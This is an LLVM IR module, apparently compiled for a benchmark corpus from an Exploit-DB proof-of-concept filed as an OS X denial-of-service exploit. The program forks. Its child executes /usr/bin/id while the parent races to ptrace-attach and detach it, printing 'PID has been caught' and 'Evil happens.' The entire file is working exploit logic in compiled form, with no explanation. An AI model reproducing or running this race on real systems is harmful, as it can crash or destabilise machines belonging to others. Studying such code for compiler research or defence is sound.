; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_9845.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_9845.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"id\00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@__const.main.argv = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@__const.main.envp = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i8* null], align 16
@.str.2 = private unnamed_addr constant [12 x i8] c"/usr/bin/id\00", align 1
@PT_ATTACH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [28 x i8] c"[ PID: %d has been caught!\0A\00", align 1
@PT_DETACH = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"Evil happens.\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"Fail!\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca [4 x i8*], align 16
  %4 = alloca [2 x i8*], align 16
  store i32 0, i32* %1, align 4
  %5 = bitcast [4 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %5, i8* align 16 bitcast ([4 x i8*]* @__const.main.argv to i8*), i64 32, i1 false)
  %6 = bitcast [2 x i8*]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 bitcast ([2 x i8*]* @__const.main.envp to i8*), i64 16, i1 false)
  %7 = call i64 (...) @fork()
  store i64 %7, i64* %2, align 8
  %8 = load i64, i64* %2, align 8
  %9 = icmp eq i64 %8, 0
  br i1 %9, label %10, label %15

10:                                               ; preds = %0
  %11 = call i32 @usleep(i32 100)
  %12 = getelementptr inbounds [4 x i8*], [4 x i8*]* %3, i64 0, i64 0
  %13 = getelementptr inbounds [2 x i8*], [2 x i8*]* %4, i64 0, i64 0
  %14 = call i32 @execve(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8** %12, i8** %13)
  br label %36

15:                                               ; preds = %0
  %16 = call i32 @usleep(i32 820)
  %17 = load i32, i32* @PT_ATTACH, align 4
  %18 = load i64, i64* %2, align 8
  %19 = call i64 @ptrace(i32 %17, i64 %18, i32 0, i32 0)
  %20 = icmp eq i64 %19, 0
  br i1 %20, label %21, label %33

21:                                               ; preds = %15
  %22 = load i64, i64* %2, align 8
  %23 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i64 %22)
  %24 = load i32, i32* @PT_DETACH, align 4
  %25 = load i64, i64* %2, align 8
  %26 = call i64 @ptrace(i32 %24, i64 %25, i32 0, i32 0)
  %27 = icmp slt i64 %26, 0
  br i1 %27, label %28, label %30

28:                                               ; preds = %21
  %29 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  br label %30

30:                                               ; preds = %28, %21
  %31 = call i32 @usleep(i32 1)
  %32 = call i32 @wait(i32 0)
  br label %35

33:                                               ; preds = %15
  %34 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  br label %35

35:                                               ; preds = %33, %30
  br label %36

36:                                               ; preds = %35, %10
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @fork(...) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i64 @ptrace(i32, i64, i32, i32) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @wait(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
